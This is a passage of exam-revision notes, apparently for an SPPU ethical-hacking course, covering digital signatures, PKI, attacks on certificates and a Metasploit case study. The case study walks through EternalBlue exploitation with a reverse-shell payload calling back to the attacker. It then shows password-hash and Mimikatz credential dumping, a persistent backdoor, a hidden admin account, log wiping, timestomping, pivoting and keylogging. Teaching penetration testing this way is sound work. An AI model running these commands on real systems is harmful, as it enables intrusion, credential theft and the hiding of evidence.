| Algorithm | Based On | Usage |
|-----------|----------|-------|
| **RSA-PSS** | RSA | Widely used in TLS, S/MIME |
| **ECDSA** | Elliptic Curve Cryptography | Used in Bitcoin, TLS |
| **EdDSA (Ed25519)** | Edwards Curve | Modern, fast, secure |
| **DSA** | Discrete Logarithm | Legacy |

### PKI (Public Key Infrastructure)

**Definition**: PKI is a framework of policies, procedures, hardware, software, and roles that manages **digital certificates** and **public-key encryption**.

**PKI Components**:

| Component | Role |
|-----------|------|
| **CA (Certificate Authority)** | Issues and revokes digital certificates (Verisign, DigiCert, Let's Encrypt) |
| **RA (Registration Authority)** | Verifies identity before CA issues certificate |
| **VA (Validation Authority)** | Validates certificates (checks revocation status) |
| **Certificate Repository** | Public storage of issued certificates (LDAP, HTTP) |
| **CRL (Certificate Revocation List)** | List of revoked certificates |
| **OCSP (Online Certificate Status Protocol)** | Real-time certificate status check |

**X.509 Certificate Structure**:

```
Certificate:
  Version
  Serial Number
  Signature Algorithm
  Issuer (CA name)
  Validity Period (Not Before / Not After)
  Subject (owner)
  Subject Public Key Info (algorithm + public key)
  Extensions (Key Usage, Subject Alternative Name, etc.)
  Signature (CA's digital signature)
```

**Certificate Chain of Trust**:
```
Root CA (self-signed) ── signs ──→ Intermediate CA ── signs ──→ End-Entity Certificate
    ↑ trusted by browser                              (website, email, client)
```

**Types of Certificates**:

| Type | Validation Level | Use Case |
|------|-----------------|----------|
| **DV (Domain Validation)** | Low — domain ownership only | HTTPS, basic websites |
| **OV (Organization Validation)** | Medium — domain + org verification | Business websites |
| **EV (Extended Validation)** | High — rigorous identity check | Banking, financial (shows green bar) |
| **Self-Signed** | No CA — created by owner | Testing, internal use |

### Attacks on PKI and Digital Signatures

| Attack | Description | Example |
|--------|-------------|---------|
| **Man-in-the-Middle (MITM)** | Intercept and modify certificates in transit | ARP spoofing + SSLstrip |
| **CA Compromise** | Attacker compromises a CA and issues fake certificates | **DigiNotar hack (2011)** — issued fake Google certs |
| **Collision Attack** | Two certificates with same hash (MD5 collision) | **Flame malware (2012)** — forged Microsoft certificate |
| **Revocation Bypass** | Ignoring CRL/OCSP checks | Browser does not check revocation |
| **Private Key Theft** | Steal CA or end-entity private key | **Heartbleed (2014)** — leaked private keys |
| **SSL Stripping** | Downgrade HTTPS to HTTP | SSLstrip tool (Moxie Marlinspike) |
| **Phishing with Valid Certs** | Attacker gets DV cert for phishing domain | Let's Encrypt (free DV certs — no identity check) |
| **Rogue Certificate** | Fake certificate from rogue CA inserted into trust store | Malware installing fake root CA |
| **Downgrade Attack** | Force use of weaker protocol/cipher | POODLE, FREAK, Logjam |

**Case Study — DigiNotar Breach (2011)**:
1. Dutch CA DigiNotar was compromised.
2. Attackers issued **fake certificates** for Google, Mozilla, Yahoo, etc.
3. Used for **MITM attacks** in Iran (targeting Gmail users).
4. Result: DigiNotar was **revoked** by all major browsers and went bankrupt.

**Case Study — Heartbleed (CVE-2014-0160)**:
1. Vulnerability in OpenSSL's Heartbeat extension.
2. Allowed reading **64KB of server memory** — could leak private keys.
3. Millions of servers affected.
4. Required **mass certificate revocation** and re-issuance.

**Case Study — Flame Malware MD5 Collision (2012)**:
1. Flame malware used an **MD5 collision** to forge a Microsoft Terminal Server Licensing Service certificate.
2. The forged certificate allowed the malware to sign updates as if from Microsoft.
3. Demonstrated the danger of MD5 in code-signing.

### SPPU Exam Tip
> For "Explain Digital Signatures and PKI", cover **how digital signatures work** (hash + sign diagram), **PKI components** (CA, RA, CRL, OCSP), **X.509 certificate structure**, and **at least 3 attacks** (CA compromise, collision attack, SSL stripping). Mention **DigiNotar and Heartbleed case studies**.

---

## 3.9 Case Study: Exploitation with Metasploit

### Scenario
A penetration tester has discovered a Windows Server 2008 R2 machine at **192.168.1.10** during scanning. The machine has port **445 (SMB)** open. The tester will use Metasploit to exploit the **EternalBlue (MS17-010)** vulnerability, escalate privileges, maintain access, and pivot to the internal network.

### Phase 1: Reconnaissance

```bash
# Scan target
nmap -sS -sV -O -p- 192.168.1.10

# Results:
# PORT     STATE  SERVICE     VERSION
# 135/tcp  open   msrpc       Microsoft Windows RPC
# 139/tcp  open   netbios-ssn
# 445/tcp  open   microsoft-ds Windows Server 2008 R2
# 3389/tcp open   ms-wbt-server
# OS: Windows Server 2008 R2

# Check SMB vulnerability with NSE
nmap --script smb-vuln-ms17-010 192.168.1.10

# Result: Host is likely VULNERABLE to MS17-010
```

### Phase 2: Exploitation

```bash
# Start Metasploit
msfconsole -q

# Search for EternalBlue
msf > search eternalblue

# Use the exploit
msf > use exploit/windows/smb/ms17_010_eternalblue

# View options
msf > show options

# Set target
msf > set RHOSTS 192.168.1.10

# Set payload (x64 required for this exploit)
msf > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set attacker IP and port
msf > set LHOST 192.168.1.100
msf > set LPORT 4444

# Execute exploit
msf > exploit

[*] Started reverse TCP handler on 192.168.1.100:4444
[*] 192.168.1.10:445 - Connecting to target...
[*] 192.168.1.10:445 - Target OS: Windows Server 2008 R2
[*] 192.168.1.10:445 - Sending exploit...
[*] Sending stage (200262 bytes) to 192.168.1.10
[*] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.10:49201)
```

### Phase 3: Post-Exploitation

```bash
# System information
meterpreter > sysinfo
Computer        : WIN-2K8R2
OS              : Windows Server 2008 R2 (6.1 Build 7601)
Architecture    : x64
System Language : en_US
Meterpreter     : x64/windows

# Current privilege
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
# Already SYSTEM — no escalation needed!

# Dump password hashes
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
john:1000:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::
```

### Phase 4: Privilege Escalation (if needed)

```bash
# If not SYSTEM, attempt escalation
meterpreter > getsystem
... Got SYSTEM via Token Duplication

# Check privileges
meterpreter > getprivs

# Run local exploit suggester for additional vulnerabilities
meterpreter > run post/multi/recon/local_exploit_suggester
```

### Phase 5: Persistence

```bash
# Install persistent backdoor (starts on boot, reconnects every 10s)
meterpreter > run persistence -X -i 10 -p 4444 -r 192.168.1.100

# Alternative: Create a scheduled task
meterpreter > run scheduleme -m 5 -c "C:\Windows\Temp\backdoor.exe"

# Create new user for backdoor access
meterpreter > shell
net user backdoor P@ssw0rd123! /add
net localgroup Administrators backdoor /add
exit
```

### Phase 6: Covering Tracks

```bash
# Clear event logs
meterpreter > run clearev
[*] Wiping 48 records from Application...
[*] Wiping 12 records from System...
[*] Wiping 24 records from Security...

# Timestomp the payload file
meterpreter > timestomp C:\Windows\Temp\backdoor.exe -c "01/01/2010 12:00:00" -m "01/01/2010 12:00:00"

# Migrate to a trusted process (hides payload)
meterpreter > ps | grep explorer
meterpreter > migrate 1234    # explorer.exe PID

# Clear command history
meterpreter > shell
del %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
exit
```

### Phase 7: Pivoting

```bash
# Discover internal network
meterpreter > ipconfig
# IP: 10.10.10.5 (internal), 192.168.1.10 (DMZ)

# View ARP table (other hosts in internal network)
meterpreter > arp

# Add route to internal network
meterpreter > run autoroute -s 10.10.10.0/24

# Background session
meterpreter > background

# Use internal network through pivot
msf > use auxiliary/scanner/portscan/tcp
msf > set RHOSTS 10.10.10.0/24
msf > set PORTS 22,80,443,3389,445
msf > run

# Forward internal service to local machine
msf > sessions -i 1
meterpreter > portfwd add -L 127.0.0.1 -l 33890 -p 3389 -r 10.10.10.50

# Now connect to localhost:33890 to access internal host's RDP
# rdesktop 127.0.0.1:33890
```

### Phase 8: Credential Harvesting

```bash
# Dump hashes using smart_hashdump
meterpreter > run post/windows/gather/smart_hashdump

# Extract clear-text credentials with Mimikatz (kiwi)
meterpreter > load kiwi
meterpreter > creds_all
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets

# Keylogging
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop

# Screenshot
meterpreter > screenshot
```

### Full Attack Chain Summary

```
┌────────────────────────────────────────────────────────┐
│                   ATTACK CHAIN                         │
├────────────────────────────────────────────────────────┤
│                                                        │
│  Reconnaissance                                        │
│  └─ nmap scan → port 445 open, SMB vulnerable          │
│                                                        │
│  Exploitation                                          │
│  └─ Metasploit EternalBlue → SYSTEM access             │
│                                                        │
│  Post-Exploitation                                     │
│  ├─ sysinfo, hashdump, screenshot                      │
│  ├─ Credential dumping (kiwi/mimikatz)                 │
│  └─ Load incognito for token impersonation             │
│                                                        │
│  Persistence                                           │
│  ├─ run persistence → auto-start backdoor              │
│  └─ Create hidden admin account                        │
│                                                        │
│  Covering Tracks                                       │
│  ├─ clearev → delete event logs                        │
│  └─ timestomp → modify file timestamps                 │
│                                                        │
│  Pivoting                                              │
│  ├─ autoroute → route to internal network              │
│  └─ portfwd → forward RDP to internal host             │
│                                                        │
└────────────────────────────────────────────────────────┘
```

### SPPU Exam Tip
> For "Case study on Metasploit", describe a **complete attack scenario** from reconnaissance to pivoting. Include **actual commands** and **output snippets**. End with an **attack chain diagram**. The case study should demonstrate understanding of all 5 phases of ethical hacking.

---

## Quick Revision Summary

### Metasploit Key Commands

| Command | Purpose |
|---------|---------|
| `msfconsole` | Start Metasploit |
| `search <cve/keyword>` | Search modules |
| `use <path>` | Select module |
| `show options` | View parameters |
| `set RHOSTS <ip>` | Set target IP |
| `set PAYLOAD <payload>` | Choose payload |
| `exploit` / `run` | Execute |
| `sessions -i <id>` | Interact with session |
| `background` | Send session to background |

### Key Meterpreter Commands

| Command | Purpose |
|---------|---------|
| `sysinfo` | System details |
| `getuid` | Current user |
| `getsystem` | Escalate to SYSTEM |
| `hashdump` | Dump password hashes |
| `shell` | OS command shell |
| `download` / `upload` | File transfer |
| `run persistence` | Install backdoor |
| `run clearev` | Clear event logs |
| `load kiwi` | Load Mimikatz |
| `keyscan_start` | Start keylogger |
| `screenshot` | Capture screen |
| `migrate <PID>` | Move to another process |
| `run autoroute` | Add route for pivoting |
| `portfwd add` | Port forwarding |

### Cryptography Comparison

| Type | Key | Speed | Use Case |
|------|-----|-------|----------|
| **Symmetric (AES)** | Single shared key | Fast | Bulk encryption |
| **Asymmetric (RSA)** | Public + Private | Slow | Key exchange, signing |
| **Hashing (SHA-256)** | No key | Fastest | Integrity, passwords |
| **Steganography** | Optional | Depends | Covert communication |

### Attacks Quick Reference

| Attack | Target | Mitigation |
|--------|--------|------------|
| **Brute Force** | Passwords, keys | Large key space, rate limiting |
| **Dictionary** | Passwords | Salt, complex policies |
| **Rainbow Table** | Hashed passwords | Salt each password |
| **Birthday Attack** | Hash functions | Use SHA-256+ |
| **Side-Channel** | Algorithm implementation | Constant-time code |
| **Padding Oracle** | CBC mode encryption | Use GCM/CCM mode |
| **MITM** | Network communication | TLS certificate validation |
| **CA Compromise** | PKI trust | Certificate pinning, monitoring |
| **SSL Stripping** | HTTPS downgrade | HSTS header |
| **SHA-1 Collision** | Hash integrity | Use SHA-2/SHA-3 |

### Sample 5-Mark Questions (SPPU Pattern)

1. **Explain the architecture of Metasploit Framework with a block diagram.**
2. **Differentiate between bind shell and reverse shell. Which is preferred and why?**
3. **Explain how exploits are found, selected, and executed in Metasploit.**
4. **What is privilege escalation? Explain any 4 techniques for Windows.**
5. **Explain post-exploitation activities in detail.**
6. **What is pivoting? Explain with a diagram and commands.**
7. **Define cryptography and explain its 5 key objectives.**
8. **Compare symmetric and asymmetric encryption with examples.**
9. **Explain AES, RSA, and SHA with their known attacks.**
10. **What is a digital signature? Explain how PKI works.**
11. **Write a case study on exploitation using Metasploit.**
12. **Explain steganography and how it is used in hacking.**
13. **Describe the SHAthered attack and its impact.**
14. **Explain the role of hashing in password storage and its attacks.**
15. **What is a CA compromise? Explain the DigiNotar case study.**

---

### Mnemonics

**5 Goals of Cryptography** → **CIA + AN**
> **C**onfidentiality, **I**ntegrity, **A**vailability, **A**uthentication, **N**on-Repudiation

**Metasploit Exploit Workflow** → **S**earch → **U**se → **S**et → **P**ayload → **E**xploit
> **Mnemonic**: "**S**ome **U**sers **S**et **P**ayloads **E**veryday"

**Symmetric Algorithms** → **A**ES, **D**ES, **B**lowfish, **T**wofish
> **Mnemonic**: "**A**ll **D**ogs **B**ark **T**wice"

**Asymmetric Algorithms** → **R**SA, **E**CC, **D**iffie-**H**ellman, **D**SA
> **Mnemonic**: "**R**are **E**lephants **D**o **H**omework **D**aily"

**PKI Components** → **C**A, **R**A, **V**A, **C**RL, **O**CSP
> **Mnemonic**: "**C**ar **R**uns **V**ery **C**arefully **O**n **S**unday **P**arkways"
